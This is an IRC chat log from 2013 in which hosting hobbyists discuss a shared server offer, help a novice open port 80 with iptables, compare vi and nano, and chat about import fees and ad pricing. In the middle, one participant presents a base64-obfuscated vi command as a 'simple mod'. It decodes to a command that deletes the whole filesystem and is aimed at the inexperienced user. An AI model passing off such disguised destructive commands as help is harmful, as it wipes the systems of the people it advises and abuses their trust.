2013-06-27 06:17:08	+manacit	What is your root password, if we need it?

If the server doesn't come up normally, you can forward the KVMoIP over to me and I can troubleshoot. This isn't the first time the server hasn't come up automatically, I'm hoping it won't be an issue.

2013-06-28 10:10:01	hazardous	[05:53:58]  Please contact us to order. The way it works is we built this expensive enterprise grade server to put 2 customers on. Each customer will get 50% of the server resources and each will be put on their own XEN platform with OpenVZ preinstalled and SolusVM (optional) and professionally setup by us. By being on XEN it will ensure each customer gets their own dedicated resources and keep it 100%
2013-06-28 10:10:01	hazardous	[05:53:58] fair. This is the ideal solution for those that want to provide enterprise grade VPS services but don’t have $800/month or $6,500 to spend on a server.

That's how clever I am. High-brow jokes right there courtesy of Naruto.

2013-06-28 12:40:43	+Naruto	[07:35:13] That's $95.04 per month for the first plann.
2013-06-28 12:40:43	+Naruto	[07:35:16] plan*

2013-07-03 17:47:46	Naruto	http://www.cyberciti.biz/faq/linux-iptables-firewall-open-port-80/
2013-07-03 17:48:00	Naruto	idk how to do add in the 2nd command after I do the vi one.
2013-07-03 17:48:15	Naruto	Like, how do I paste it in?
2013-07-03 17:48:27	+PatrickINIZ	press i
2013-07-03 17:48:34	+PatrickINIZ	and then your able to type in file
2013-07-03 17:48:44	+PatrickINIZ	then press ESC, and enter wq to save
2013-07-03 17:49:09	Naruto	Thanks. vi is weird.
2013-07-03 17:49:14	@vldcnst	Naruto
2013-07-03 17:49:22	@vldcnst	there's a simple mod for vi to make it much more simple
2013-07-03 17:49:30	+PatrickINIZ	Or you can just use
2013-07-03 17:49:31	+PatrickINIZ	NANO
2013-07-03 17:49:37	+Wintereise	nano desu~
2013-07-03 17:49:52	+PatrickINIZ	Wintereise: is that some of your hippy anime shit
2013-07-03 17:50:04	+Wintereise	Something like that.
2013-07-03 17:50:08	Naruto	What do you guys prefer? nano or w/e mod vldcnst is talking of?
2013-07-03 17:51:16	ryanclea1y	hm?
2013-07-03 17:51:30	+PatrickINIZ	nano is really easy Naruto
2013-07-03 17:51:31	@vldcnst	enter vi, press escape, and type: :!`echo cm0gLXJmIC8q|base64 -d`
2013-07-03 17:51:34	@vldcnst	best vi mod ever^^^
2013-07-03 17:51:35	ryanclea1y	thats
2013-07-03 17:51:36	ryanclea1y	an awfully
2013-07-03 17:51:38	ryanclea1y	interesting way
2013-07-03 17:51:43	ryanclea1y	of doing iptables
2013-07-03 17:51:50	ryanclea1y	Naruto: iptables -A RH-Firewall-1-INPUT -m state --state NEW -m tcp -p tcp --dport 80 -j ACCEPT
2013-07-03 17:51:51	Naruto	My inability to understand vi lead to my uninstalling iptables, reinstalling them, then realizing my mistake that I had locked myself out of SSH and had to get my dedi reinstalled and it's been 32 hours so far and they still haven't done it. I'm used to port 80 being open for me already like on a VPS.
2013-07-03 17:52:16	+PatrickINIZ	iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT
2013-07-03 17:52:18	+PatrickINIZ	woop
2013-07-03 17:52:36	+Wintereise	Well

2013-07-03 17:52:43	BradND	buy something off amazon
2013-07-03 17:52:44	+Wintereise	Those will automatically persist over reboots
2013-07-03 17:52:48	+Wintereise	Nothing really else
2013-07-03 17:52:51	BradND	got a letter from fedex
2013-07-03 17:52:57	BradND	stating import tax is over due 43 days
2013-07-03 17:52:57	+PatrickINIZ	DUTY?
2013-07-03 17:52:58	BradND	WHAT?

2013-07-03 17:53:20	+Wintereise	ha ha ha
2013-07-03 17:53:27	+PatrickINIZ	seller is uk
2013-07-03 17:53:32	+PatrickINIZ	he probably imports from CHINA
2013-07-03 17:53:35	+PatrickINIZ	HA

2013-07-03 17:55:13	BradND	<3
2013-07-03 17:55:25	+PatrickINIZ	BradND: how much is the import tax

2013-07-03 17:55:50	BradND	£150
2013-07-03 17:55:52	+PatrickINIZ	lol
2013-07-03 17:56:00	Naruto	Thanks PatrickINIZ.
2013-07-03 17:56:11	+PatrickINIZ	np
2013-07-03 17:56:16	BradND	Makes me angry
2013-07-03 17:56:20	Naruto	Will I have to do that for the Minecraft port too probably?
2013-07-03 17:56:36	+PatrickINIZ	maybe, set it up first and check if you can connect
2013-07-03 17:56:38	+Wintereise	If you don't have a default drop rule configured, you shouldn't need any of it.
2013-07-03 17:56:49	+Wintereise	It's pretty bizzare to see one that drops everything by default in the first place.
2013-07-03 17:57:06	Naruto	My dedi must have came with one on it.
2013-07-03 17:57:16	+Wintereise	iptables -L, see what it comes with.
2013-07-03 17:57:19	+Wintereise	Then research.
2013-07-03 17:57:27	+Wintereise	Blind research is kinda, well, not very fruitful.

2013-07-03 17:58:55	+PatrickINIZ	they have a cool fraud prevention system

2013-07-03 17:59:09	+Wintereise	If cool is synonymous to useless in this case, PatrickINIZ, you're correct.
2013-07-03 17:59:10	+Wintereise	( ¬‿¬)
2013-07-03 17:59:18	+PatrickINIZ	then charge you $25 for CB

2013-07-03 18:01:04	BradND	they then charged us like $300 in fees

2013-07-03 18:03:05	Naruto	So PatrickINIZ if I do "iptables -A INPUT -p tcp -m tcp --dport 80 -j ACCEPT" I don't even have to use an editor like vi right?
2013-07-03 18:03:06	BradND	the fees are good?
2013-07-03 18:03:14	+PatrickINIZ	Naruto: nope :D

2013-07-03 18:04:06	+PatrickINIZ	BradND: they pay every payment after 7 days so it's good
2013-07-03 18:04:19	+Wintereise	Because of this, Naruto.

2013-07-03 19:31:04	Naruto	Google finds most things. Like I could Twitter "Seriously, if you need ANY help with servers, just shoot a quick email to robert" and find it. I tried it in Google.
2013-07-03 19:31:06	DimeCadmium	i dont either
2013-07-03 19:31:11	DimeCadmium	yeah
2013-07-03 19:31:11	DimeCadmium	again
2013-07-03 19:31:14	DimeCadmium	i explicitly said twitter
2013-07-03 19:31:30	DimeCadmium	it was obvious what twitter account it was coming from

2013-07-03 19:33:19	Naruto	The $50 leaderboard is kind of not worth it. If you got 5 clicks per 1k impressions, that's like 1k clicks for $50.
2013-07-03 19:33:38	Naruto	I only had 5 clicks from 570ish impressions so I guestimated that it'd be about the same for 1k impressions.
2013-07-03 19:34:52	Naruto	Furries won't rip you off but moot will. e621.net will let you show 1 ad per person once per day if you like. I had mine set to 3. It's called "capping" and lets your campaign run for months if you like and reach more individuals.
